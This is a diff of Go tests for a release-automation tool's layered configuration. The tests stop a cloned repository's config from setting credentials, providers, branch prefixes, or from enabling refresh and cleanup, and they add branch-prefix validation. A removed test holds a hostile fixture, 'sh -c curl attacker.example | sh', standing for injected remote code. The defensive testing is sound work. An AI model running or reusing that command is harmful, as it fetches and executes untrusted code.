@@ -3,6 +3,7 @@ package entities_test
 import (
 	"os"
 	"path/filepath"
+	"strconv"
 	"testing"
 
 	"github.com/stretchr/testify/assert"
@@ -195,77 +196,69 @@ func TestMergeLanguagesConfig(t *testing.T) {
 		assert.Equal(t, []string{"ts", "tsx"}, ts.Extensions)
 	})
 
-	t.Run("should replace refresh commands when user provides their own", func(t *testing.T) {
+	t.Run("should turn a language's refresh on when a later layer sets it", func(t *testing.T) {
 		t.Parallel()
 
 		// given
-		withDefaultCommand := map[string]entities.LanguageConfig{
-			"typescript": {
-				RefreshCommands: []entities.RefreshCommand{
-					{Run: []string{"npm", "install", "--package-lock-only"}, Files: []string{"package-lock.json"}},
-				},
-			},
+		inherited := map[string]entities.LanguageConfig{
+			"typescript": {Extensions: []string{"ts"}},
 		}
+		enabled := true
 		overrides := map[string]entities.LanguageConfig{
-			"typescript": {
-				RefreshCommands: []entities.RefreshCommand{
-					{Run: []string{"yarn", "install", "--mode=update-lockfile"}, Files: []string{"yarn.lock"}},
-				},
-			},
+			"typescript": {Refresh: &enabled},
 		}
 
 		// when
-		result := entities.MergeLanguagesConfig(withDefaultCommand, overrides)
+		result := entities.MergeLanguagesConfig(inherited, overrides)
 
 		// then
 		ts := result["typescript"]
-		assert.Equal(t, overrides["typescript"].RefreshCommands, ts.RefreshCommands)
+		require.NotNil(t, ts.Refresh)
+		assert.True(t, *ts.Refresh)
+		assert.Equal(t, []string{"ts"}, ts.Extensions, "the inherited fields must survive")
 	})
 
-	t.Run("should clear refresh commands when user provides an empty list", func(t *testing.T) {
+	t.Run("should turn a language's refresh off when a later layer clears it", func(t *testing.T) {
 		t.Parallel()
 
 		// given
-		withDefaultCommand := map[string]entities.LanguageConfig{
-			"typescript": {
-				RefreshCommands: []entities.RefreshCommand{
-					{Run: []string{"npm", "install", "--package-lock-only"}, Files: []string{"package-lock.json"}},
-				},
-			},
+		enabled := true
+		disabled := false
+		inherited := map[string]entities.LanguageConfig{
+			"typescript": {Refresh: &enabled},
 		}
 		overrides := map[string]entities.LanguageConfig{
-			"typescript": {RefreshCommands: []entities.RefreshCommand{}},
+			"typescript": {Refresh: &disabled},
 		}
 
 		// when
-		result := entities.MergeLanguagesConfig(withDefaultCommand, overrides)
+		result := entities.MergeLanguagesConfig(inherited, overrides)
 
 		// then
 		ts := result["typescript"]
-		assert.Empty(t, ts.RefreshCommands)
+		require.NotNil(t, ts.Refresh, "an explicit false is a decision, not an omission")
+		assert.False(t, *ts.Refresh)
 	})
 
-	t.Run("should keep default refresh commands when user provides none", func(t *testing.T) {
+	t.Run("should keep the inherited refresh when a later layer omits it", func(t *testing.T) {
 		t.Parallel()
 
 		// given
-		withDefaultCommand := map[string]entities.LanguageConfig{
-			"typescript": {
-				RefreshCommands: []entities.RefreshCommand{
-					{Run: []string{"npm", "install", "--package-lock-only"}, Files: []string{"package-lock.json"}},
-				},
-			},
+		enabled := true
+		inherited := map[string]entities.LanguageConfig{
+			"typescript": {Refresh: &enabled},
 		}
 		overrides := map[string]entities.LanguageConfig{
 			"typescript": {Extensions: []string{"tsx"}},
 		}
 
 		// when
-		result := entities.MergeLanguagesConfig(withDefaultCommand, overrides)
+		result := entities.MergeLanguagesConfig(inherited, overrides)
 
 		// then
 		ts := result["typescript"]
-		assert.Equal(t, withDefaultCommand["typescript"].RefreshCommands, ts.RefreshCommands)
+		require.NotNil(t, ts.Refresh)
+		assert.True(t, *ts.Refresh)
 	})
 }
 
@@ -277,14 +270,6 @@ func writeNamedConfig(t *testing.T, dir, name, content string) string {
 	require.NoError(t, os.WriteFile(path, []byte(content), 0o644))
 
 	return path
-}
-
-// readProjectConfigFrom writes content as a per-project config and reads it back. Every
-// ReadProjectConfig case shares that preamble and differs only in the content.
-func readProjectConfigFrom(t *testing.T, content string) (*entities.GlobalConfig, error) {
-	t.Helper()
-
-	return entities.ReadProjectConfig(writeNamedConfig(t, t.TempDir(), ".autobump.yaml", content))
 }
 
 func TestFindProjectConfigFile(t *testing.T) {
@@ -355,342 +340,329 @@ func TestFindProjectConfigFile(t *testing.T) {
 	})
 }
 
-func TestReadProjectConfig(t *testing.T) {
+func TestApplyRestrictedLayer(t *testing.T) {
 	t.Parallel()
 
-	t.Run("should decode valid YAML with languages section", func(t *testing.T) {
+	t.Run("should decode a languages section", func(t *testing.T) {
 		t.Parallel()
 
 		// given
-		content := "languages:\n  python:\n    extensions:\n      - 'py'\n"
+		layer := restrictedLayer("languages:\n  python:\n    extensions:\n      - 'py'\n")
 
 		// when
-		cfg, err := readProjectConfigFrom(t, content)
+		cfg, err := entities.ApplyLayer(&entities.GlobalConfig{}, layer)
 
 		// then
 		require.NoError(t, err)
 		require.NotNil(t, cfg)
-		assert.Contains(t, cfg.LanguagesConfig, "python")
 		assert.Equal(t, []string{"py"}, cfg.LanguagesConfig["python"].Extensions)
 	})
 
-	t.Run("should decode valid YAML without languages section", func(t *testing.T) {
+	t.Run("should ignore a credential a repository tried to set", func(t *testing.T) {
 		t.Parallel()
 
 		// given
-		content := "github_access_token: 'some-token'\n"
+		base := &entities.GlobalConfig{GitHubAccessToken: "operator-token"}
+		layer := restrictedLayer("github_access_token: 'repository-token'\n")
 
 		// when
-		cfg, err := readProjectConfigFrom(t, content)
+		cfg, err := entities.ApplyLayer(base, layer)
 
 		// then
 		require.NoError(t, err)
-		require.NotNil(t, cfg)
-		assert.Nil(t, cfg.LanguagesConfig)
+		assert.Equal(t, "operator-token", cfg.GitHubAccessToken,
+			"a repository has no field to put a credential in, so there is no trust check "+
+				"to get wrong -- the key simply has nowhere to land")
 	})
 
-	t.Run("should return error when file does not exist", func(t *testing.T) {
+	t.Run("should ignore every operator-only key", func(t *testing.T) {
+		t.Parallel()
+
+		// given -- the keys a repository's own file must never speak for
+		base := &entities.GlobalConfig{
+			GitLabAccessToken:      "operator-gitlab",
+			GitHubAccessToken:      "operator-github",
+			AzureDevOpsAccessToken: "operator-azure",
+			GpgKeyPath:             "operator-gpg",
+			SSHKeyPath:             "operator-ssh",
+			BumpBranchPrefix:       "chore/bump-",
+			Projects:               []entities.ProjectConfig{{Path: "/operator/repo"}},
+		}
+		layer := restrictedLayer(`
+gitlab_access_token: 'repo-gitlab'
+github_access_token: 'repo-github'
+azure_devops_access_token: 'repo-azure'
+gpg_key_path: 'repo-gpg'
+gpg_key_passphrase: 'repo-gpg-pass'
+ssh_key_path: 'repo-ssh'
+ssh_key_passphrase: 'repo-ssh-pass'
+ssh_auth_sock: 'repo-sock'
+bump_branch_prefix: 'feat/'
+providers:
+  - type: 'github'
+    token: 'repo-token'
+    organizations: ['attacker']
+projects:
+  - path: '/repo/somewhere-else'
+`)
+
+		// when
+		cfg, err := entities.ApplyLayer(base, layer)
+
+		// then
+		require.NoError(t, err)
+		assert.Equal(t, "operator-gitlab", cfg.GitLabAccessToken)
+		assert.Equal(t, "operator-github", cfg.GitHubAccessToken)
+		assert.Equal(t, "operator-azure", cfg.AzureDevOpsAccessToken)
+		assert.Equal(t, "operator-gpg", cfg.GpgKeyPath)
+		assert.Empty(t, cfg.GpgKeyPassphrase)
+		assert.Equal(t, "operator-ssh", cfg.SSHKeyPath)
+		assert.Empty(t, cfg.SSHKeyPassphrase)
+		assert.Empty(t, cfg.SSHAuthSock)
+		assert.Equal(t, "chore/bump-", cfg.BumpBranchPrefix,
+			"the prefix decides what stale-branch cleanup deletes")
+		assert.Empty(t, cfg.Providers)
+		assert.Equal(t, []entities.ProjectConfig{{Path: "/operator/repo"}}, cfg.Projects)
+	})
+
+	t.Run("should accept the settings a repository may speak for", func(t *testing.T) {
 		t.Parallel()
 
 		// given
-		configPath := filepath.Join(t.TempDir(), "nonexistent.yaml")
+		layer := restrictedLayer(`
+changelog_path: 'CHANGELOG_PROPRIETARY.md'
+versioning: 'fork-dot'
+detect_chlog: false
+cleanup_stale_branches: false
+refresh: false
+`)
 
 		// when
-		cfg, err := entities.ReadProjectConfig(configPath)
+		cfg, err := entities.ApplyLayer(&entities.GlobalConfig{}, layer)
+
+		// then
+		require.NoError(t, err)
+		assert.Equal(t, "CHANGELOG_PROPRIETARY.md", cfg.ChangelogPath)
+		assert.Equal(t, entities.VersioningForkDot, cfg.Versioning)
+		require.NotNil(t, cfg.DetectChlog)
+		assert.False(t, *cfg.DetectChlog)
+		require.NotNil(t, cfg.CleanupStaleBranches)
+		assert.False(t, *cfg.CleanupStaleBranches)
+		require.NotNil(t, cfg.Refresh)
+		assert.False(t, *cfg.Refresh)
+	})
+
+	// `refresh` and `cleanup_stale_branches` are the two switches a restricted layer may
+	// turn off but never on. Owning the argv was only half of what made `refresh_commands`
+	// untrusted; the other half is whether anything is executed at all, and a package
+	// manager resolving a lockfile still runs what the cloned repository supplies.
+	t.Run("should not let a repository turn the refresh on", func(t *testing.T) {
+		t.Parallel()
+
+		// given
+		layer := restrictedLayer("refresh: true\n")
+
+		// when
+		cfg, err := entities.ApplyLayer(&entities.GlobalConfig{}, layer)
+
+		// then
+		require.NoError(t, err)
+		assert.Nil(t, cfg.Refresh, "off is safe in a way on is not: it only ever removes an action")
+	})
+
+	t.Run("should not let a repository turn a language's refresh on", func(t *testing.T) {
+		t.Parallel()
+
+		// given
+		layer := restrictedLayer("languages:\n  typescript:\n    refresh: true\n")
+
+		// when
+		cfg, err := entities.ApplyLayer(&entities.GlobalConfig{}, layer)
+
+		// then
+		require.NoError(t, err)
+		assert.Nil(t, cfg.LanguagesConfig["typescript"].Refresh)
+	})
+
+	t.Run("should let a repository turn a language's refresh off", func(t *testing.T) {
+		t.Parallel()
+
+		// given
+		enabled := true
+		base := &entities.GlobalConfig{
+			LanguagesConfig: map[string]entities.LanguageConfig{
+				"typescript": {Refresh: &enabled},
+			},
+		}
+		layer := restrictedLayer("languages:\n  typescript:\n    refresh: false\n")
+
+		// when
+		cfg, err := entities.ApplyLayer(base, layer)
+
+		// then
+		require.NoError(t, err)
+		require.NotNil(t, cfg.LanguagesConfig["typescript"].Refresh)
+		assert.False(t, *cfg.LanguagesConfig["typescript"].Refresh)
+	})
+
+	t.Run("should not let a repository turn cleanup on", func(t *testing.T) {
+		t.Parallel()
+
+		// given -- applySkipCleanupFlag runs before this layer, so honouring an enable here
+		// would silently override --skip-cleanup and delete branches the operator asked to keep
+		disabled := false
+		base := &entities.GlobalConfig{CleanupStaleBranches: &disabled}
+		layer := restrictedLayer("cleanup_stale_branches: true\n")
+
+		// when
+		cfg, err := entities.ApplyLayer(base, layer)
+
+		// then
+		require.NoError(t, err)
+		require.NotNil(t, cfg.CleanupStaleBranches)
+		assert.False(t, *cfg.CleanupStaleBranches, "--skip-cleanup must have the last word")
+	})
+
+	t.Run("should return an error when the document is not valid YAML", func(t *testing.T) {
+		t.Parallel()
+
+		// given
+		layer := restrictedLayer("invalid: [yaml: {broken")
+
+		// when
+		cfg, err := entities.ApplyLayer(&entities.GlobalConfig{}, layer)
 
 		// then
 		require.Error(t, err)
 		assert.Nil(t, cfg)
 	})
 
-	t.Run("should return error when file contains invalid YAML", func(t *testing.T) {
+	t.Run("should ignore an unknown key rather than refusing to run", func(t *testing.T) {
 		t.Parallel()
 
 		// given
-		tmpDir := t.TempDir()
-		configPath := filepath.Join(tmpDir, ".autobump.yaml")
-		require.NoError(t, os.WriteFile(configPath, []byte("invalid: [yaml: {broken"), 0o644))
+		layer := restrictedLayer(
+			"custom_unknown_field: 'value'\nlanguages:\n  go:\n    extensions:\n      - 'go'\n",
+		)
 
 		// when
-		cfg, err := entities.ReadProjectConfig(configPath)
-
-		// then
-		require.Error(t, err)
-		assert.Nil(t, cfg)
-	})
-
-	t.Run("should ignore unknown fields in non-strict mode", func(t *testing.T) {
-		t.Parallel()
-
-		// given
-		content := "custom_unknown_field: 'value'\nlanguages:\n  go:\n    extensions:\n      - 'go'\n"
-
-		// when
-		cfg, err := readProjectConfigFrom(t, content)
+		cfg, err := entities.ApplyLayer(&entities.GlobalConfig{}, layer)
 
 		// then
 		require.NoError(t, err)
-		require.NotNil(t, cfg)
 		assert.Contains(t, cfg.LanguagesConfig, "go")
 	})
-
-	t.Run("should read versioning and changelog_path from per-project config", func(t *testing.T) {
-		t.Parallel()
-
-		// given
-		content := "versioning: 'fork-dot'\nchangelog_path: 'CHANGELOG_PROPRIETARY.md'\n"
-
-		// when
-		cfg, err := readProjectConfigFrom(t, content)
-
-		// then
-		require.NoError(t, err)
-		require.NotNil(t, cfg)
-		assert.Equal(t, entities.VersioningForkDot, cfg.Versioning)
-		assert.Equal(t, "CHANGELOG_PROPRIETARY.md", cfg.ChangelogPath)
-	})
-
-	t.Run("should correctly parse version files with regex patterns", func(t *testing.T) {
-		t.Parallel()
-
-		// given
-		tmpDir := t.TempDir()
-		configPath := filepath.Join(tmpDir, ".autobump.yaml")
-		content := `languages:
-  typescript:
-    version_files:
-      - path: 'package.json'
-        patterns:
-          - '(\s*"version":\s*")\d+\.\d+\.\d+(",)'
-`
-		require.NoError(t, os.WriteFile(configPath, []byte(content), 0o644))
-
-		// when
-		cfg, err := entities.ReadProjectConfig(configPath)
-
-		// then
-		require.NoError(t, err)
-		require.NotNil(t, cfg)
-		ts := cfg.LanguagesConfig["typescript"]
-		require.Len(t, ts.VersionFiles, 1)
-		assert.Equal(t, "package.json", ts.VersionFiles[0].Path)
-		require.Len(t, ts.VersionFiles[0].Patterns, 1)
-	})
 }
 
-func TestCopyGlobalConfigWithLanguageOverrides(t *testing.T) {
+// restrictedLayer builds the layer a repository's own configuration is applied as.
+func restrictedLayer(content string) entities.ConfigLayer {
+	//nolint:exhaustruct // Strict is false for a restricted layer by construction
+	return entities.ConfigLayer{
+		Name:     entities.LayerProjectConfig,
+		Origin:   ".autobump.yaml",
+		Data:     []byte(content),
+		Scope:    entities.ScopeRestricted,
+		Optional: true,
+	}
+}
+
+func TestRefreshEnabled(t *testing.T) {
 	t.Parallel()
 
-	t.Run("should create a copy with merged languages without mutating original", func(t *testing.T) {
+	enabled := true
+	disabled := false
+
+	t.Run("should be off when nothing sets it", func(t *testing.T) {
 		t.Parallel()
 
-		// given
-		original := &entities.GlobalConfig{
-			GitHubAccessToken: "my-token",
-			LanguagesConfig: map[string]entities.LanguageConfig{
-				"golang": {Extensions: []string{"go"}},
-			},
-		}
-		overrides := map[string]entities.LanguageConfig{
-			"python": {Extensions: []string{"py"}},
+		// given -- the refresh starts a package manager, so it is opt-in rather than opt-out
+		global := &entities.GlobalConfig{
+			LanguagesConfig: map[string]entities.LanguageConfig{"typescript": {}},
 		}
 
 		// when
-		result := entities.CopyGlobalConfigWithLanguageOverrides(original, overrides)
+		result := entities.RefreshEnabled(global, &entities.ProjectConfig{}, "typescript")
 
 		// then
-		assert.Contains(t, result.LanguagesConfig, "golang")
-		assert.Contains(t, result.LanguagesConfig, "python")
-		assert.Equal(t, "my-token", result.GitHubAccessToken)
-		assert.NotContains(t, original.LanguagesConfig, "python")
-		assert.Len(t, original.LanguagesConfig, 1)
+		assert.False(t, result)
 	})
 
-	t.Run("should preserve all non-language fields from original", func(t *testing.T) {
+	t.Run("should be on when the top level sets it", func(t *testing.T) {
 		t.Parallel()
 
 		// given
-		original := &entities.GlobalConfig{
-			GitHubAccessToken:      "gh-token",
-			GitLabAccessToken:      "gl-token",
-			AzureDevOpsAccessToken: "ado-token",
-			GpgKeyPath:             "/path/to/key",
-			GpgKeyPassphrase:       "passphrase",
-			LanguagesConfig: map[string]entities.LanguageConfig{
-				"golang": {Extensions: []string{"go"}},
-			},
-		}
-		overrides := map[string]entities.LanguageConfig{}
+		global := &entities.GlobalConfig{Refresh: &enabled}
 
 		// when
-		result := entities.CopyGlobalConfigWithLanguageOverrides(original, overrides)
+		result := entities.RefreshEnabled(global, &entities.ProjectConfig{}, "typescript")
 
 		// then
-		assert.Equal(t, "gh-token", result.GitHubAccessToken)
-		assert.Equal(t, "gl-token", result.GitLabAccessToken)
-		assert.Equal(t, "ado-token", result.AzureDevOpsAccessToken)
-		assert.Equal(t, "/path/to/key", result.GpgKeyPath)
-		assert.Equal(t, "passphrase", result.GpgKeyPassphrase)
+		assert.True(t, result)
 	})
 
-	t.Run("should handle empty overrides returning equivalent languages", func(t *testing.T) {
+	t.Run("should let the language override the top level", func(t *testing.T) {
 		t.Parallel()
 
 		// given
-		original := &entities.GlobalConfig{
+		global := &entities.GlobalConfig{
+			Refresh: &disabled,
 			LanguagesConfig: map[string]entities.LanguageConfig{
-				"golang": {Extensions: []string{"go"}},
-			},
-		}
-		overrides := map[string]entities.LanguageConfig{}
-
-		// when
-		result := entities.CopyGlobalConfigWithLanguageOverrides(original, overrides)
-
-		// then
-		assert.Equal(t, original.LanguagesConfig, result.LanguagesConfig)
-	})
-
-	t.Run("should add new language not present in original", func(t *testing.T) {
-		t.Parallel()
-
-		// given
-		original := &entities.GlobalConfig{
-			LanguagesConfig: map[string]entities.LanguageConfig{
-				"golang": {Extensions: []string{"go"}},
-			},
-		}
-		overrides := map[string]entities.LanguageConfig{
-			"ruby": {Extensions: []string{"rb"}, SpecialPatterns: []string{"Gemfile"}},
-		}
-
-		// when
-		result := entities.CopyGlobalConfigWithLanguageOverrides(original, overrides)
-
-		// then
-		assert.Contains(t, result.LanguagesConfig, "golang")
-		assert.Contains(t, result.LanguagesConfig, "ruby")
-		assert.Equal(t, []string{"rb"}, result.LanguagesConfig["ruby"].Extensions)
-	})
-
-	t.Run("should merge version files for existing language", func(t *testing.T) {
-		t.Parallel()
-
-		// given
-		original := &entities.GlobalConfig{
-			LanguagesConfig: map[string]entities.LanguageConfig{
-				"typescript": {
-					Extensions: []string{"ts"},
-					VersionFiles: []entities.VersionFile{
-						{Path: "package.json", Patterns: []string{`("version":\s*")\d+\.\d+\.\d+(")`}},
-					},
-				},
-			},
-		}
-		overrides := map[string]entities.LanguageConfig{
-			"typescript": {
-				VersionFiles: []entities.VersionFile{
-					{Path: "manifest.json", Patterns: []string{`("version":\s*")\d+\.\d+\.\d+(")`}},
-				},
+				"typescript": {Refresh: &enabled},
 			},
 		}
 
 		// when
-		result := entities.CopyGlobalConfigWithLanguageOverrides(original, overrides)
+		result := entities.RefreshEnabled(global, &entities.ProjectConfig{}, "typescript")
 
 		// then
-		ts := result.LanguagesConfig["typescript"]
-		assert.Len(t, ts.VersionFiles, 2)
-		assert.Equal(t, "package.json", ts.VersionFiles[0].Path)
-		assert.Equal(t, "manifest.json", ts.VersionFiles[1].Path)
-		assert.Equal(t, []string{"ts"}, ts.Extensions)
+		assert.True(t, result)
 	})
 
-	t.Run("should not mutate the original LanguagesConfig map", func(t *testing.T) {
+	t.Run("should let the project override the language", func(t *testing.T) {
 		t.Parallel()
 
 		// given
-		original := &entities.GlobalConfig{
-			LanguagesConfig: map[string]entities.LanguageConfig{
-				"golang": {Extensions: []string{"go"}},
-			},
-		}
-		overrides := map[string]entities.LanguageConfig{
-			"golang": {SpecialPatterns: []string{"go.sum"}},
-			"python": {Extensions: []string{"py"}},
-		}
-		originalLangsCount := len(original.LanguagesConfig)
-
-		// when
-		_ = entities.CopyGlobalConfigWithLanguageOverrides(original, overrides)
-
-		// then
-		assert.Len(t, original.LanguagesConfig, originalLangsCount)
-		assert.NotContains(t, original.LanguagesConfig, "python")
-		assert.Empty(t, original.LanguagesConfig["golang"].SpecialPatterns)
-	})
-
-	t.Run("should ignore a refresh command injected by the released repository", func(t *testing.T) {
-		t.Parallel()
-
-		// given
-		// This is the config that ships inside the repository being released, which in run
-		// mode is one AutoBump discovered rather than one anybody vetted.
 		global := &entities.GlobalConfig{
 			LanguagesConfig: map[string]entities.LanguageConfig{
-				"typescript": {
-					RefreshCommands: []entities.RefreshCommand{
-						{Run: []string{"yarn", "install", "--mode=update-lockfile"}, Files: []string{"yarn.lock"}},
-					},
-				},
-			},
-		}
-		projectOverrides := map[string]entities.LanguageConfig{
-			"typescript": {
-				RefreshCommands: []entities.RefreshCommand{
-					{Run: []string{"sh", "-c", "curl attacker.example | sh"}, Files: []string{"yarn.lock"}},
-				},
+				"typescript": {Refresh: &enabled},
 			},
 		}
 
 		// when
-		merged := entities.CopyGlobalConfigWithLanguageOverrides(global, projectOverrides)
+		result := entities.RefreshEnabled(global, &entities.ProjectConfig{Refresh: &disabled}, "typescript")
 
 		// then
-		refreshCommands := merged.LanguagesConfig["typescript"].RefreshCommands
-		require.Len(t, refreshCommands, 1)
-		assert.Equal(t, []string{"yarn", "install", "--mode=update-lockfile"}, refreshCommands[0].Run)
+		assert.False(t, result, "an explicit false must beat a true below it")
 	})
 
-	t.Run("should let the released repository opt out of a refresh", func(t *testing.T) {
+	t.Run("should be off for a language that does not set it", func(t *testing.T) {
 		t.Parallel()
 
 		// given
-		// Clearing only ever removes execution, so it is the one thing a repository is
-		// allowed to say about refresh commands.
 		global := &entities.GlobalConfig{
 			LanguagesConfig: map[string]entities.LanguageConfig{
-				"typescript": {
-					RefreshCommands: []entities.RefreshCommand{
-						{Run: []string{"yarn", "install", "--mode=update-lockfile"}, Files: []string{"yarn.lock"}},
-					},
-				},
+				"typescript": {Refresh: &enabled},
 			},
-		}
-		projectOverrides := map[string]entities.LanguageConfig{
-			"typescript": {RefreshCommands: []entities.RefreshCommand{}},
 		}
 
 		// when
-		merged := entities.CopyGlobalConfigWithLanguageOverrides(global, projectOverrides)
+		result := entities.RefreshEnabled(global, &entities.ProjectConfig{}, "golang")
 
 		// then
-		assert.Empty(t, merged.LanguagesConfig["typescript"].RefreshCommands)
-		assert.Len(t, global.LanguagesConfig["typescript"].RefreshCommands, 1, "the original must not move")
+		assert.False(t, result)
+	})
+
+	t.Run("should tolerate a nil configuration", func(t *testing.T) {
+		t.Parallel()
+
+		// when
+		result := entities.RefreshEnabled(nil, nil, "typescript")
+
+		// then
+		assert.False(t, result)
 	})
 }
 
-// TestExpandHome is deliberately not parallel: it calls t.Setenv, which the runtime forbids in a parallel test.
 func TestExpandHome(t *testing.T) {
 	t.Run("should expand tilde prefix when path starts with ~/", func(t *testing.T) {
 		// given
@@ -777,7 +749,7 @@ func TestHandleTokenFile(t *testing.T) {
 func TestValidateGlobalConfig(t *testing.T) {
 	t.Parallel()
 
-	t.Run("should return nil when config has languages and valid projects", func(t *testing.T) {
+	t.Run("should return nil when the configuration is usable", func(t *testing.T) {
 		t.Parallel()
 
 		// given
@@ -789,29 +761,27 @@ func TestValidateGlobalConfig(t *testing.T) {
 		}
 
 		// when
-		err := entities.ValidateGlobalConfig(cfg, false)
+		err := entities.ValidateGlobalConfig(cfg)
 
 		// then
 		assert.NoError(t, err)
 	})
 
-	t.Run("should return error when languages config is nil", func(t *testing.T) {
+	t.Run("should accept a configuration with no languages of its own", func(t *testing.T) {
 		t.Parallel()
 
-		// given
-		cfg := &entities.GlobalConfig{
-			LanguagesConfig: nil,
-		}
+		// given -- the built-in defaults are the base of every run, so an empty languages
+		// map here means the layers were folded without them, not that the operator forgot
+		cfg := &entities.GlobalConfig{LanguagesConfig: nil}
 
 		// when
-		err := entities.ValidateGlobalConfig(cfg, false)
+		err := entities.ValidateGlobalConfig(cfg)
 
 		// then
-		require.Error(t, err)
-		assert.ErrorIs(t, err, entities.ErrLanguagesKeyMissingError)
+		assert.NoError(t, err)
 	})
 
-	t.Run("should return error when project path is empty", func(t *testing.T) {
+	t.Run("should return an error when a project path is empty", func(t *testing.T) {
 		t.Parallel()
 
 		// given
@@ -821,62 +791,92 @@ func TestValidateGlobalConfig(t *testing.T) {
 		}
 
 		// when
-		err := entities.ValidateGlobalConfig(cfg, false)
+		err := entities.ValidateGlobalConfig(cfg)
 
 		// then
 		require.Error(t, err)
 		assert.Contains(t, err.Error(), "projects[0].path")
 	})
 
-	t.Run("should return error when batch mode has no projects", func(t *testing.T) {
+	t.Run("should return an error when the bump branch prefix is unusable", func(t *testing.T) {
 		t.Parallel()
 
 		// given
-		cfg := &entities.GlobalConfig{
-			LanguagesConfig: map[string]entities.LanguageConfig{"go": {}},
-			Projects:        []entities.ProjectConfig{},
-		}
+		cfg := &entities.GlobalConfig{BumpBranchPrefix: "chore/"}
 
 		// when
-		err := entities.ValidateGlobalConfig(cfg, true)
+		err := entities.ValidateGlobalConfig(cfg)
 
 		// then
 		require.Error(t, err)
-		assert.Contains(t, err.Error(), "projects")
+		assert.ErrorIs(t, err, entities.ErrBumpBranchPrefixInvalid)
 	})
+}
 
-	t.Run("should return error when batch mode has no access token", func(t *testing.T) {
+func TestValidateBumpBranchPrefix(t *testing.T) {
+	t.Parallel()
+
+	// The prefix is not only what new branches are named after -- it is the argument to a
+	// destructive operation. cleanupStaleBumpBranches deletes every remote branch starting
+	// with it and closes the pull request attached to each, so a prefix wider than the
+	// operator meant does not produce a confusing branch name, it deletes other people's
+	// work. An operator's typo is as capable of that as a hostile repository would be.
+	accepted := []string{
+		"",                  // unset means the default, which is valid by construction
+		"chore/bump-",       // AutoBump's own
+		"chore/autoupdate-", // AutoUpdate's, in the same namespace
+		"release/autobump-",
+		"a/b",
+	}
+	for _, prefix := range accepted {
+		t.Run("should accept "+strconv.Quote(prefix), func(t *testing.T) {
+			t.Parallel()
+
+			// when
+			err := entities.ValidateBumpBranchPrefix(prefix)
+
+			// then
+			assert.NoError(t, err)
+		})
+	}
+
+	rejected := map[string]string{
+		"an empty prefix matches every branch":          "   ",
+		"a bare name can escape the namespace":          "bump-",
+		"a protected branch name":                       "main",
+		"another protected branch name":                 "MASTER",
+		"a bare namespace sweeps every tool's branches": "chore/",
+		"a refs/ prefix silently matches nothing":       "refs/heads/bump-",
+		"a name git will not accept":                    "chore/bump ",
+		"a double slash":                                "chore//bump-",
+		"a parent traversal":                            "chore/../bump-",
+		"a leading dash":                                "-chore/bump-",
+		"a leading slash":                               "/chore/bump-",
+		"a .lock suffix":                                "chore/bump.lock",
+		"a glob character":                              "chore/bump-*",
+		"a control character":                           "chore/bump-\x01",
+	}
+	for reason, prefix := range rejected {
+		t.Run("should reject "+reason, func(t *testing.T) {
+			t.Parallel()
+
+			// when
+			err := entities.ValidateBumpBranchPrefix(prefix)
+
+			// then
+			require.Error(t, err, "prefix %q must be rejected", prefix)
+			assert.ErrorIs(t, err, entities.ErrBumpBranchPrefixInvalid)
+		})
+	}
+
+	t.Run("should accept the default prefix", func(t *testing.T) {
 		t.Parallel()
 
-		// given
-		cfg := &entities.GlobalConfig{
-			LanguagesConfig: map[string]entities.LanguageConfig{"go": {}},
-			Projects:        []entities.ProjectConfig{{Path: "/path"}},
-		}
-
 		// when
-		err := entities.ValidateGlobalConfig(cfg, true)
+		err := entities.ValidateBumpBranchPrefix(entities.DefaultBumpBranchPrefix)
 
 		// then
-		require.Error(t, err)
-		assert.Contains(t, err.Error(), "project_access_token")
-	})
-
-	t.Run("should pass batch validation when global token is set", func(t *testing.T) {
-		t.Parallel()
-
-		// given
-		cfg := &entities.GlobalConfig{
-			LanguagesConfig:   map[string]entities.LanguageConfig{"go": {}},
-			GitHubAccessToken: "ghp_token",
-			Projects:          []entities.ProjectConfig{{Path: "/path"}},
-		}
-
-		// when
-		err := entities.ValidateGlobalConfig(cfg, true)
-
-		// then
-		assert.NoError(t, err)
+		assert.NoError(t, err, "the default must satisfy the rules it is offered as the fix for")
 	})
 }
 
@@ -943,281 +943,203 @@ func TestValidateProviders(t *testing.T) {
 	}
 }
 
-func TestReadConfig(t *testing.T) {
+func TestFinalizeGlobalConfig(t *testing.T) {
 	t.Parallel()
 
-	t.Run("should read and parse a valid config file", func(t *testing.T) {
+	t.Run("should derive a project name from its path", func(t *testing.T) {
 		t.Parallel()
 
 		// given
-		tmpDir := t.TempDir()
-		configPath := filepath.Join(tmpDir, "autobump.yaml")
-		content := `languages:
-  go:
-    extensions:
-      - 'go'
-    special_patterns:
-      - 'go.mod'
-projects:
-  - path: '/home/user/repo1'
-github_access_token: 'ghp_test123'
-`
-		require.NoError(t, os.WriteFile(configPath, []byte(content), 0o644))
+		cfg := &entities.GlobalConfig{
+			Projects: []entities.ProjectConfig{
+				{Path: "https://gitlab.com/group/repo1.git"},
+				{Path: "/home/user/repo2"},
+				{Path: "/home/user/repo3", Name: "already-named"},
+			},
+		}
 
 		// when
-		cfg, err := entities.ReadConfig(configPath)
+		entities.FinalizeGlobalConfig(cfg)
+
+		// then
+		assert.Equal(t, "repo1", cfg.Projects[0].Name)
+		assert.Equal(t, "repo2", cfg.Projects[1].Name)
+		assert.Equal(t, "already-named", cfg.Projects[2].Name)
+	})
+
+	t.Run("should read a token out of the file it names", func(t *testing.T) {
+		t.Parallel()
+
+		// given
+		tokenPath := filepath.Join(t.TempDir(), "token.key")
+		require.NoError(t, os.WriteFile(tokenPath, []byte("ghp_from_file\n"), 0o600))
+		cfg := &entities.GlobalConfig{GitHubAccessToken: tokenPath}
+
+		// when
+		entities.FinalizeGlobalConfig(cfg)
+
+		// then
+		assert.Equal(t, "ghp_from_file", cfg.GitHubAccessToken)
+	})
+
+	t.Run("should leave an inline token alone", func(t *testing.T) {
+		t.Parallel()
+
+		// given
+		cfg := &entities.GlobalConfig{GitHubAccessToken: "ghp_inline"}
+
+		// when
+		entities.FinalizeGlobalConfig(cfg)
+
+		// then
+		assert.Equal(t, "ghp_inline", cfg.GitHubAccessToken)
+	})
+}
+
+func TestReadLayerData(t *testing.T) {
+	t.Parallel()
+
+	t.Run("should read a layer from a file", func(t *testing.T) {
+		t.Parallel()
+
+		// given
+		configPath := filepath.Join(t.TempDir(), "autobump.yaml")
+		require.NoError(t, os.WriteFile(configPath, []byte("versioning: 'fork-dot'\n"), 0o600))
+
+		// when
+		data, err := entities.ReadLayerData(configPath)
 
 		// then
 		require.NoError(t, err)
-		require.NotNil(t, cfg)
-		assert.Contains(t, cfg.LanguagesConfig, "go")
-		assert.Equal(t, "ghp_test123", cfg.GitHubAccessToken)
